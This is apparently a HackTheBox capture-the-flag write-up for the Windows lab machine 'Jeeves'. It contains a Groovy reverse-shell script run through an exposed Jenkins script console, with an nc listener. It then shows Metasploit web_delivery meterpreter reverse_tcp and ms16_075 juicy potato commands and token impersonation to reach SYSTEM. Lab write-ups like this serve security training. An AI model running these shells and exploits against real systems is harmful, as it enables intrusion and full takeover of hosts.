# Hackthebox - Jeeves - Windows

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -A -p- 10.10.10.63                                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 13:34 EDT
Nmap scan report for 10.10.10.63
Host is up (0.025s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (88%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (88%), Microsoft Windows 10 1607 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 10 1511 - 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-08T22:44:11
|_  start_date: 2022-04-08T22:41:38
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h07m23s, deviation: 0s, median: 5h07m23s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   24.57 ms 10.10.14.1
2   24.81 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.40 seconds
```

## Port 80

- We have this page  
![image](https://user-images.githubusercontent.com/96747355/162480794-234ea1a6-2011-4711-8a9f-314e2c507d5b.png)  
- It seems gives stack trace when trying to search for something  
![image](https://user-images.githubusercontent.com/96747355/162480895-aa19e42f-fb54-4856-8ad7-466d12a88bc0.png)  
- But it is just an image, indeed the action of the form will just go to error.html  
![image](https://user-images.githubusercontent.com/96747355/162491383-cb18df99-b49a-4756-90e3-799604a31d7f.png)  
- Gobuster does not give much

## Port 50000

- Here is what we see on the browser for this port:  
![image](https://user-images.githubusercontent.com/96747355/162493795-4fe4f32f-faab-4c7d-99ad-1f9b0a412953.png)  
- Gosbuster does not always work for the first time we need to use different wordlists, I tried a few before getting to the askjeeves result.
The one that gave the result is `directory-list-2.3-big.txt`  
![image](https://user-images.githubusercontent.com/96747355/162494821-57bd90c5-9d26-48f7-939a-870263ae7143.png)  
- If we navigate to /askjeeves we have a jenkins server  
![image](https://user-images.githubusercontent.com/96747355/162495024-ec8fd547-0209-4636-884a-b1875a8dd578.png)  
- If we go to jenkins cli we can use a jar and execute command from it  
![image](https://user-images.githubusercontent.com/96747355/162495714-82ed035e-60cf-4625-8789-efcb4a866a31.png)  
- If we look at the system info we get a user name: `kohsuke`
- Script console also seems interesting, let's try to get a reverse shell this way  
![image](https://user-images.githubusercontent.com/96747355/162497679-2689b9d3-30b4-4893-bde5-f37e39037565.png)  
We can find one online [here](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76):  
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- Let's set a listener `rlwrap nc -lvp 8044`
- It works we are `jeeves\kohsuke`  

![image](https://user-images.githubusercontent.com/96747355/162498078-6e956d86-11e2-4777-90b0-ce01df2862a4.png)  
- We can grab our user flag `type C:\Users\kohsuke\Desktop\user.txt`
- Here are our privileges  
![image](https://user-images.githubusercontent.com/96747355/162498730-ef2fc0c3-4e26-4ab7-9ddc-852a8d86f9df.png)  
We have the `SeImpersonatePrivilege` enabled  
- We can use [windows exploit suggester](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py) with sysinfo
  - `wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py`
  - `python windows-exploit-suggester.py -update` (to get the latest db file)
  - `python windows-exploit-suggester.py --database 2022-04-08-mssb.xls -i ../sysinfo.txt`
- We have a lot of options including potatoes

## Privesc with rotten potato

- Launch msfconsole
- `use exploit/multi/script/web_delivery`
- `show targets`
- `set target 2` for PSH
- `set payload windows/meterpreter/reverse_tcp`
- `set lhost tun0`
- `set SRVHOST tun0`  
![image](https://user-images.githubusercontent.com/96747355/162503009-09193505-df80-40bc-a82d-ecfb66ab7e0f.png)  
- Now we just need to execute this in our target  
![image](https://user-images.githubusercontent.com/96747355/162503184-48f16a14-1aa9-47e1-bf00-58fb2009657f.png)  
- And we get a meterpreter session  
![image](https://user-images.githubusercontent.com/96747355/162503310-814f334c-1d69-4d5d-80c4-a9d94c3675c0.png)  
- Let's interact with it `sessions -i 1`
- To get the build in potato options lets use metasploit exploit suggester `run post/multi/recon/local_exploit_suggester`  
![image](https://user-images.githubusercontent.com/96747355/162503846-dd872c5a-8441-4438-878d-6aacc4ffd8a7.png)  
- Using ctrl+z lets now background the shell
- `use exploit/windows/local/ms16_075_reflection_juicy`
- `show options`
- `set session 1`
- `set LHOST tun0`
- `run`  
![image](https://user-images.githubusercontent.com/96747355/162506387-94421e6a-131a-49cf-a480-bd059561f668.png)  
- And it worked  
![image](https://user-images.githubusercontent.com/96747355/162506825-ffece6c6-6452-4fb5-91a3-980250db8dfd.png)  
- `load incognito`
- `list_tokens -u`
- `impersonate_token "NT AUTHORITY\SYSTEM"`
- Event though we got authority system the root flag is not here instead we have this  
![image](https://user-images.githubusercontent.com/96747355/162508399-2b49e318-02e9-4a1f-b127-2a54e6b320ca.png)  
- if we `dir /R` we can see our flag
- `more < hm.txt:root.txt:$DATA` we can do this to print it  
- [Here](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/) are a few methods on how to print alternate data streams

